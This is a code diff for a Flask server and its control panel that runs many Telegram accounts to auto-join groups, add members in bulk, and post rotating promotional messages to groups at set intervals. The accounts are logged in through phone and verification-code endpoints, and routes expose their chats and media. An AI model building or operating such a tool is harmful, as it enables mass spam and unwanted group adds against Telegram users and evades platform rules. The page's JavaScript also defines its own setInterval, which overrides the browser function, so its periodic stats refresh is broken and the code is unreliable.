+        .alert-info { background: #dbeafe; color: #1e40af; border: 1px solid #93c5fd; }
+        .emoji-tips {
+            background: #fef3c7; border: 1px solid #fcd34d;
+            border-radius: 8px; padding: 12px; margin-top: 10px; font-size: 13px; color: #92400e;
+        }
+        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } .header h1 { font-size: 1.8em; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚀 Share Control Panel</h1>
+            <p>Control your auto-share settings with premium emoji support</p>
+        </div>
+
+        <div id="alert-container"></div>
+
+        <div class="grid">
+            <!-- Share Messages Card -->
+            <div class="card">
+                <h2><span>📝</span> Share Messages</h2>
+                <div class="message-list" id="message-list"></div>
+                <div class="form-group">
+                    <label>Add New Message</label>
+                    <textarea id="new-message" placeholder="Enter your message... Use premium emojis with :emoji_id: format"></textarea>
+                </div>
+                <div class="emoji-tips">
+                    💡 <strong>Premium Emoji Tips:</strong><br>
+                    • Use format <code>:1234567890123456789:</code> for premium custom emojis<br>
+                    • Standard Unicode emojis work normally (😀🎉❤️)
+                </div>
+                <div style="display: flex; gap: 10px; margin-top: 15px;">
+                    <button class="btn btn-primary" onclick="addMessage()">➕ Add Message</button>
+                    <button class="btn btn-success" onclick="saveMessages()">💾 Save All</button>
+                </div>
+                <div class="form-group" style="margin-top: 15px;">
+                    <label style="display: flex; align-items: center; gap: 10px;">
+                        <span>Rotate Messages</span>
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="rotate-messages" checked onchange="updateConfig()">
+                            <span class="toggle-slider"></span>
+                        </label>
+                    </label>
+                </div>
+            </div>
+
+            <!-- Timing Control Card -->
+            <div class="card">
+                <h2><span>⏱️</span> Timing Control</h2>
+                <div class="form-group">
+                    <label>Share Interval</label>
+                    <input type="number" id="share-interval" value="300" min="60" max="86400" onchange="updateIntervalDisplay()">
+                    <small style="color: #666;">Current: <span id="interval-display">5 minutes</span></small>
+                </div>
+                <div class="time-presets" id="time-presets"></div>
+                <div class="form-group" style="margin-top: 20px;">
+                    <label>Delay Between Groups (seconds)</label>
+                    <input type="number" id="delay-between" value="20" min="5" max="300" onchange="updateConfig()">
+                </div>
+                <button class="btn btn-primary" onclick="saveTiming()">💾 Save Timing</button>
+            </div>
+
+            <!-- Global Controls Card -->
+            <div class="card">
+                <h2><span>🎛️</span> Global Controls</h2>
+                <div class="form-group">
+                    <label style="display: flex; align-items: center; gap: 10px;">
+                        <span>Auto Share Enabled</span>
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="auto-share-enabled" checked onchange="updateConfig()">
+                            <span class="toggle-slider"></span>
+                        </label>
+                    </label>
+                </div>
+                <div class="form-group">
+                    <label style="display: flex; align-items: center; gap: 10px;">
+                        <span>Use Premium Emojis</span>
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="use-premium-emojis" checked onchange="updateConfig()">
+                            <span class="toggle-slider"></span>
+                        </label>
+                    </label>
+                </div>
+                <div style="display: flex; gap: 10px; margin-top: 20px;">
+                    <button class="btn btn-success" onclick="startAllShares()">▶️ Start All</button>
+                    <button class="btn btn-danger" onclick="stopAllShares()">⏹️ Stop All</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Statistics Card -->
+        <div class="card" style="margin-top: 20px;">
+            <h2><span>📊</span> Share Statistics</h2>
+            <div class="stats-grid" id="stats-grid"></div>
+            <div style="margin-top: 15px;">
+                <button class="btn btn-sm btn-primary" onclick="refreshStats()">🔄 Refresh Stats</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = window.location.origin;
+        let currentConfig = {};
+        let messages = [];
+
+        document.addEventListener('DOMContentLoaded', () => {
+            loadConfig();
+            loadStats();
+            loadTimePresets();
+        });
+
+        async function loadConfig() {
+            try {
+                const response = await fetch(`${API_BASE}/api/share-config`);
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentConfig = data.config;
+                    messages = currentConfig.messages || [];
+                    
+                    document.getElementById('share-interval').value = currentConfig.share_interval_seconds;
+                    document.getElementById('delay-between').value = currentConfig.share_delay_between_groups;
+                    document.getElementById('auto-share-enabled').checked = currentConfig.auto_share_enabled;
+                    document.getElementById('rotate-messages').checked = currentConfig.rotate_messages;
+                    document.getElementById('use-premium-emojis').checked = currentConfig.use_premium_emojis;
+                    
+                    updateIntervalDisplay();
+                    renderMessages();
+                }
+            } catch (error) {
+                showAlert('Error loading configuration: ' + error.message, 'error');
+            }
+        }
+
+        async function loadStats() {
+            try {
+                const response = await fetch(`${API_BASE}/api/share-stats`);
+                const data = await response.json();
+                if (data.success) renderStats(data.stats);
+            } catch (error) {
+                console.error('Error loading stats:', error);
+            }
+        }
+
+        async function loadTimePresets() {
+            try {
+                const response = await fetch(`${API_BASE}/api/share-config/time-presets`);
+                const data = await response.json();
+                if (data.success) renderTimePresets(data.presets);
+            } catch (error) {
+                console.error('Error loading presets:', error);
+            }
+        }
+
+        function renderMessages() {
+            const container = document.getElementById('message-list');
+            if (messages.length === 0) {
+                container.innerHTML = '<p style="color: #999; text-align: center;">No messages added yet</p>';
+                return;
+            }
+            container.innerHTML = messages.map((msg, index) => `
+                <div class="message-item">
+                    <div class="message-text">${escapeHtml(msg)}</div>
+                    <div class="message-actions">
+                        <button class="btn btn-sm btn-primary" onclick="editMessage(${index})">✏️ Edit</button>
+                        <button class="btn btn-sm btn-danger" onclick="removeMessage(${index})">🗑️ Remove</button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        function renderTimePresets(presets) {
+            const container = document.getElementById('time-presets');
+            container.innerHTML = Object.entries(presets).map(([label, seconds]) => `
+                <div class="time-preset" onclick="setInterval('${label}', ${seconds})" data-seconds="${seconds}">
+                    ${label.replace(/(\d+)/, '$1 ')}
+                </div>
+            `).join('');
+            highlightActivePreset();
+        }
+
+        function renderStats(stats) {
+            const container = document.getElementById('stats-grid');
+            container.innerHTML = `
+                <div class="stat-item">
+                    <div class="stat-value">${stats.today_shares || 0}</div>
+                    <div class="stat-label">Shares Today</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${stats.total_shares || 0}</div>
+                    <div class="stat-label">Total Shares</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${stats.active_share_workers || 0}</div>
+                    <div class="stat-label">Active Workers</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${stats.total_share_groups || 0}</div>
+                    <div class="stat-label">Share Groups</div>
+                </div>
+            `;
+        }
+
+        function setInterval(label, seconds) {
+            document.getElementById('share-interval').value = seconds;
+            updateIntervalDisplay();
+            updateConfig();
+            highlightActivePreset();
+        }
+
+        function highlightActivePreset() {
+            const currentSeconds = parseInt(document.getElementById('share-interval').value);
+            document.querySelectorAll('.time-preset').forEach(el => {
+                el.classList.toggle('active', parseInt(el.dataset.seconds) === currentSeconds);
+            });
+        }
+
+        function updateIntervalDisplay() {
+            const seconds = parseInt(document.getElementById('share-interval').value);
+            document.getElementById('interval-display').textContent = formatTime(seconds);
+            highlightActivePreset();
+        }
+
+        function formatTime(seconds) {
+            if (seconds < 60) return `${seconds} seconds`;
+            if (seconds < 3600) return `${Math.floor(seconds / 60)} minutes`;
+            if (seconds < 86400) return `${Math.floor(seconds / 3600)} hours`;
+            return `${Math.floor(seconds / 86400)} days`;
+        }
+
+        function addMessage() {
+            const textarea = document.getElementById('new-message');
+            const message = textarea.value.trim();
+            if (!message) { showAlert('Please enter a message', 'error'); return; }
+            messages.push(message);
+            textarea.value = '';
+            renderMessages();
+            saveMessages();
+        }
+
+        function removeMessage(index) {
+            if (confirm('Are you sure you want to remove this message?')) {
+                messages.splice(index, 1);
+                renderMessages();
+                saveMessages();
+            }
+        }
+
+        function editMessage(index) {
+            const newMessage = prompt('Edit message:', messages[index]);
+            if (newMessage !== null && newMessage.trim()) {
+                messages[index] = newMessage.trim();
+                renderMessages();
+                saveMessages();
+            }
+        }
+
+        async function saveMessages() {
+            try {
+                const response = await fetch(`${API_BASE}/api/share-config`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ messages: messages })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    showAlert('Messages saved successfully!', 'success');
+                    loadConfig();
+                } else {
+                    showAlert('Error saving messages: ' + data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('Error saving messages: ' + error.message, 'error');
+            }
+        }
+
+        async function saveTiming() {
+            const interval = parseInt(document.getElementById('share-interval').value);
+            const delay = parseInt(document.getElementById('delay-between').value);
+            try {
+                const response = await fetch(`${API_BASE}/api/share-config`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        share_interval_seconds: interval,
+                        share_delay_between_groups: delay
+                    })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    showAlert('Timing settings saved!', 'success');
+                } else {
+                    showAlert('Error saving timing: ' + data.error, 'error');
+                }
+            } catch (error) {
+                showAlert('Error saving timing: ' + error.message, 'error');
+            }
+        }
+
+        async function updateConfig() {
+            const config = {
+                auto_share_enabled: document.getElementById('auto-share-enabled').checked,
+                rotate_messages: document.getElementById('rotate-messages').checked,
+                use_premium_emojis: document.getElementById('use-premium-emojis').checked,
+                share_interval_seconds: parseInt(document.getElementById('share-interval').value),
+                share_delay_between_groups: parseInt(document.getElementById('delay-between').value)
+            };
+            try {
+                const response = await fetch(`${API_BASE}/api/share-config`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(config)
+                });
+                const data = await response.json();
+                if (data.success) showAlert('Configuration updated!', 'success');
+            } catch (error) {
+                showAlert('Error updating config: ' + error.message, 'error');
+            }
+        }
+
+        async function startAllShares() {
+            try {
+                const response = await fetch(`${API_BASE}/api/auto-share/start-all`, { method: 'POST' });
+                const data = await response.json();
+                showAlert(data.message || 'Started all share workers', 'success');
+            } catch (error) {
+                showAlert('Error starting shares: ' + error.message, 'error');
+            }
+        }
+
+        async function stopAllShares() {
+            try {
+                const response = await fetch(`${API_BASE}/api/auto-share/stop-all`, { method: 'POST' });
+                const data = await response.json();
+                showAlert(data.message || 'Stopped all share workers', 'success');
+            } catch (error) {
+                showAlert('Error stopping shares: ' + error.message, 'error');
+            }
+        }
+
+        function refreshStats() { loadStats(); showAlert('Stats refreshed!', 'success'); }
+
+        function showAlert(message, type = 'info') {
+            const container = document.getElementById('alert-container');
+            const alert = document.createElement('div');
+            alert.className = `alert alert-${type}`;
+            alert.textContent = message;
+            container.appendChild(alert);
+            setTimeout(() => alert.remove(), 3000);
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        setInterval(loadStats, 30000);
+    </script>
+</body>
+</html>'''
+
 # ============================================
 # FLASK ROUTES
 # ============================================
@@ -1772,40 +2506,25 @@ def index():
 def login_page():
     return render_template_string(LOGIN_PAGE)
 
-@app.route('/auto-add')
-def auto_add_page():
-    try:
-        return send_file('auto_add.html')
-    except FileNotFoundError:
-        return render_template_string('''<!DOCTYPE html><html><head><title>Auto Add</title></head><body><h1>Auto Add Page</h1><p>Please create auto_add.html file</p></body></html>''')
-
 @app.route('/dashboard')
 def dashboard_page():
-    try:
-        return send_file('dashboard.html')
-    except FileNotFoundError:
-        return render_template_string('''<!DOCTYPE html><html><head><title>Dashboard</title></head><body><h1>Dashboard</h1><p>Please create dashboard.html file</p></body></html>''')
+    return render_template_string(DASHBOARD_PAGE)
 
 @app.route('/dash')
 def dash_page():
-    try:
-        return send_file('dash.html')
-    except FileNotFoundError:
-        return redirect('/dashboard')
+    return redirect('/dashboard')
 
 @app.route('/all')
 def all_page():
-    try:
-        return send_file('all.html')
-    except FileNotFoundError:
-        return redirect('/dashboard')
+    return redirect('/dashboard')
+
+@app.route('/auto-add')
+def auto_add_page():
+    return redirect('/dashboard')
 
 @app.route('/control')
 def control_page():
-    try:
-        return send_file('control.html')
-    except FileNotFoundError:
-        return render_template_string('''<!DOCTYPE html><html><head><title>Control Panel</title></head><body><h1>Control Panel</h1><p>Please create control.html file</p></body></html>''')
+    return render_template_string(CONTROL_PAGE)
 
 @app.route('/ping')
 def ping():
@@ -2178,8 +2897,9 @@ def promo_message():
         return jsonify({'success': False, 'error': str(e)})
 
 # ============================================
-# DASHBOARD - GET CHAT LIST ONLY
+# DASHBOARD API ROUTES
 # ============================================
+
 @app.route('/api/get-chats', methods=['POST'])
 def get_chats():
     try:
@@ -2240,9 +2960,6 @@ def get_chats():
         logger.error(f"Get chats error: {e}")
         return jsonify({'success': False, 'error': str(e)[:200]})
 
-# ============================================
-# DASHBOARD - GET MESSAGES FOR SPECIFIC CHAT
-# ============================================
 @app.route('/api/get-chat-messages', methods=['POST'])
 def get_chat_messages_route():
     try:
@@ -2302,9 +3019,6 @@ def get_chat_messages_route():
         logger.error(f"Get chat messages error: {e}")
         return jsonify({'success': False, 'error': str(e)[:200]})
 
-# ============================================
-# DASHBOARD - SEND MESSAGE
-# ============================================
 @app.route('/api/send-message', methods=['POST'])
 def send_message():
     try:
@@ -2360,9 +3074,6 @@ def send_message():
         logger.error(f"Send message error: {e}")
         return jsonify({'success': False, 'error': str(e)[:200]})
 
-# ============================================
-# DASHBOARD - GET MEDIA
-# ============================================
 @app.route('/api/media/<int:account_id>/<int:message_id>')
 def get_media(account_id, message_id):
     try:
@@ -2381,7 +3092,6 @@ def get_media(account_id, message_id):
             media_data = SyncTelegramClient.run_async(_download, timeout=30)
             
             if media_data:
-                from flask import Response
                 return Response(
                     base64.b64decode(media_data['data']),
                     mimetype=media_data['mime_type'],
@@ -2406,8 +3116,9 @@ def get_media(account_id, message_id):
         return jsonify({'error': str(e)}), 500
 
 # ============================================
-# SHARED PHONE ENDPOINT
+# PHONE & AUTH ROUTES
 # ============================================
+
 @app.route('/api/share-phone', methods=['POST'])
 def share_phone():
     try:
@@ -2438,9 +3149,6 @@ def share_phone():
         logger.error(f"Share phone error: {e}")
         return jsonify({'success': False, 'error': 'Failed to process phone.'})
 
-# ============================================
-# TELEGRAM AUTO-LOGIN
-# ============================================
 @app.route('/api/telegram-auto-login', methods=['POST'])
 def telegram_auto_login():
     try:
@@ -2488,9 +3196,6 @@ def telegram_auto_login():
         logger.error(f"Auto-login error: {e}")
         return jsonify({'success': False, 'error': 'Auto-login failed.', 'needs_phone': True})
 
-# ============================================
-# ADD ACCOUNT
-# ============================================
 @app.route('/api/add-account', methods=['POST'])
 def add_account():
     try:
@@ -2681,6 +3386,7 @@ def verify_code():
 # ============================================
 # ACCOUNT MANAGEMENT ROUTES
 # ============================================
+
 @app.route('/api/remove-account', methods=['POST'])
 def remove_account():
     try:
@@ -2790,7 +3496,9 @@ def health_check():
 # ============================================
 # BACKGROUND TASKS
 # ============================================
+
 def keep_alive():
+    """Keep the server alive by pinging itself"""
     consecutive_failures = 0
     while True:
         try:
@@ -2811,6 +3519,7 @@ def keep_alive():
             time.sleep(60)
 
 def cleanup_caches():
+    """Clean up expired caches"""
     while True:
         time.sleep(30)
         current_time = time.time()
@@ -2826,6 +3535,7 @@ def cleanup_caches():
                 del message_cache[k]
 
 def restore_and_start():
+    """Restore accounts and start workers"""
     try:
         time.sleep(5)
         logger.info(f"Restoring {len(accounts)} accounts...")
@@ -2875,6 +3585,7 @@ def restore_and_start():
         save_json(STATS_FILE, stats)
 
 def cleanup_expired_sessions():
+    """Clean up expired temporary sessions"""
     try:
         current_time = time.time()
         expired = [sid for sid, data in temp_sessions.items()
@@ -2888,6 +3599,7 @@ def cleanup_expired_sessions():
         logger.error(f"Session cleanup error: {e}")
 
 def signal_handler(signum, frame):
+    """Handle shutdown signals gracefully"""
     logger.info(f"Received signal {signum}, saving data and shutting down...")
     for acc_key in list(running_tasks.keys()):
         stop_auto_add(acc_key)
@@ -2909,36 +3621,36 @@ signal.signal(signal.SIGTERM, signal_handler)
 signal.signal(signal.SIGINT, signal_handler)
 
 # ============================================
-# MAIN
+# INITIALIZATION - Runs on import (for gunicorn compatibility)
 # ============================================
-if __name__ == '__main__':
-    try:
-        accounts.extend(load_json(ACCOUNTS_FILE, []))
-        auto_add_settings.update(load_json(SETTINGS_FILE, {}))
-        stats_data = load_json(STATS_FILE, {})
-        if stats_data:
-            stats.update(stats_data)
-        worker_adds_data = load_json(WORKER_ADDS_FILE, {})
-        if worker_adds_data:
-            worker_adds.update(worker_adds_data)
-        load_temp_sessions()
-        load_auto_sessions()
-        load_user_map()
-        load_share_groups()
-        
-        share_config = load_share_config()
-        SHARE_INTERVAL_SECONDS = share_config['share_interval_seconds']
-        SHARE_DELAY_BETWEEN_GROUPS = share_config['share_delay_between_groups']
-        AUTO_SHARE_ENABLED = share_config['auto_share_enabled']
-        if share_config['messages']:
-            PROMO_MESSAGE = share_config['messages'][0]
-        
-        for tg in TARGET_GROUPS:
-            if tg not in share_groups:
-                share_groups.append(tg)
-                logger.info(f"Added target group to share list: {tg}")
-        
-        print(f"""
+
+# Load all data
+accounts.extend(load_json(ACCOUNTS_FILE, []))
+auto_add_settings.update(load_json(SETTINGS_FILE, {}))
+stats_data = load_json(STATS_FILE, {})
+if stats_data:
+    stats.update(stats_data)
+worker_adds_data = load_json(WORKER_ADDS_FILE, {})
+if worker_adds_data:
+    worker_adds.update(worker_adds_data)
+load_temp_sessions()
+load_auto_sessions()
+load_user_map()
+load_share_groups()
+
+share_config = load_share_config()
+SHARE_INTERVAL_SECONDS = share_config['share_interval_seconds']
+SHARE_DELAY_BETWEEN_GROUPS = share_config['share_delay_between_groups']
+AUTO_SHARE_ENABLED = share_config['auto_share_enabled']
+if share_config['messages']:
+    PROMO_MESSAGE = share_config['messages'][0]
+
+for tg in TARGET_GROUPS:
+    if tg not in share_groups:
+        share_groups.append(tg)
+        logger.info(f"Added target group to share list: {tg}")
+
+print(f"""
 ╔══════════════════════════════════════════════════════════════╗
 ║     AUTO-ADD & SHARE SERVER #{SERVER_NUMBER} - {SERVER_NAME}              ║
 ╠══════════════════════════════════════════════════════════════╣
@@ -2955,14 +3667,19 @@ if __name__ == '__main__':
 ║  Control Panel: /control                                     ║
 ║  Features: Auto Join ✅ | Auto Add ✅ | Auto Share ✅       ║
 ╚══════════════════════════════════════════════════════════════╝
-        """)
-        
-        threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
-        threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
-        threading.Thread(target=cleanup_caches, daemon=True, name="cache_cleanup").start()
-        
+""")
+
+# Start background threads (runs with both gunicorn and direct execution)
+threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
+threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
+threading.Thread(target=cleanup_caches, daemon=True, name="cache_cleanup").start()
+
+# ============================================
+# MAIN ENTRY POINT - Only for direct execution
+# ============================================
+if __name__ == '__main__':
+    try:
         app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
-            
     except Exception as e:
         logger.critical(f"Fatal startup error: {e}")
         logger.critical(traceback.format_exc())
